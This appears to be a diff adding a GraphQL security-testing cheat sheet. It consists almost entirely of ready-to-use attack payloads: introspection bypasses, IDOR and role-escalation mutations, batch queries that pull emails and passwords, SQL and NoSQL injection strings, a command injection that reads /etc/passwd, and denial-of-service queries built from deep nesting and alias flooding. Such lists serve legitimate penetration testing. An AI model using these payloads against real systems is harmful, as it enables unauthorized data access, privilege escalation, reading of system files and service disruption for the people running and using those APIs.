@@ -1,0 +1,230 @@
+# GraphQL Security Testing Payloads
+
+## Introspection Bypass
+
+```
+# Try alternative fields
+{__schema{types{name}}}
+{__schema{queryType{name}}}
+{__type(name:"User"){name fields{}}}
+
+# Capitalization bypass
+{Schema{types{Name}}}
+{Type(Name:"User"){Name Fields{Name}}}
+
+# JSON encoding
+{"query":"{__schema{types{name}}}"}
+```
+
+## Mutation Testing
+
+### IDOR via Mutations
+
+```graphql
+mutation {
+  updateUser(id: "1", input: {role: "admin"}) {
+    id
+    role
+  }
+}
+
+mutation {
+  deleteUser(id: "1") {
+    success
+  }
+}
+```
+
+### Batch Queries (Batching Attack)
+
+```graphql
+# Send multiple queries in one request
+query {
+  user1: user(id: 1) { email password }
+  user2: user(id: 2) { email password }
+  user3: user(id: 3) { email password }
+}
+```
+
+### Depth Limiting Bypass
+
+```graphql
+# Try maximum depth
+query {
+  user(id: 1) {
+    posts {
+      comments {
+        author {
+          posts {
+            comments {
+              author { name }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+## Injection in Resolvers
+
+### SQL Injection in Query
+
+```graphql
+{
+  user(id: "1' OR '1'='1") {
+    name
+  }
+}
+```
+
+### NoSQL Injection
+
+```graphql
+{
+  user(id: {"$ne": null}) {
+    name
+  }
+}
+
+{
+  users(where: {name: {"$regex": ".*"}}) {
+    name
+  }
+}
+```
+
+### Command Injection
+
+```graphql
+{
+  search(query: "test; cat /etc/passwd") {
+    results
+  }
+}
+```
+
+## Authorization Testing
+
+### Vertical Privilege Escalation
+
+```graphql
+mutation {
+  createPost(input: {title: "Test", content: "..."}) {
+    id
+    author { role }
+  }
+}
+
+mutation {
+  updateRole(userId: "1", role: "admin") {
+    success
+  }
+}
+```
+
+### Horizontal Privilege Escalation
+
+```graphql
+query {
+  user(id: "2") {
+    email
+    privateData
+  }
+}
+
+# Try changing ID
+query {
+  user(id: "1' OR id='2'--") {
+    email
+  }
+}
+```
+
+## DoS Attacks
+
+### Resource Exhaustion
+
+```graphql
+# Large query
+query {
+  users {
+    posts {
+      comments {
+        author {
+          posts {
+            comments { text }
+          }
+        }
+      }
+    }
+  }
+}
+
+# Array expansion
+{
+  users(ids: ["1","1","1","1","1","1","1","1"]) {
+    name
+  }
+}
+```
+
+### Alias Flooding
+
+```graphql
+query {
+  a1: user(id:1){name}
+  a2: user(id:1){name}
+  a3: user(id:1){name}
+  a4: user(id:1){name}
+  a5: user(id:1){name}
+  # ... repeat 1000 times
+}
+```
+
+## File Upload
+
+```graphql
+mutation {
+  uploadFile(file: "base64_content...") {
+    filename
+    path
+  }
+}
+```
+
+## Directives
+
+### @skip and @include
+
+```graphql
+query {
+  secret @skip(if: false) {
+    data
+  }
+}
+
+query {
+  secret @include(if: true) {
+    data
+  }
+}
+```
+
+## Fragments
+
+```graphql
+fragment UserFields on User {
+  id
+  email
+  password
+  role
+}
+
+query {
+  user(id: 1) {
+    ...UserFields
+  }
+}
+```
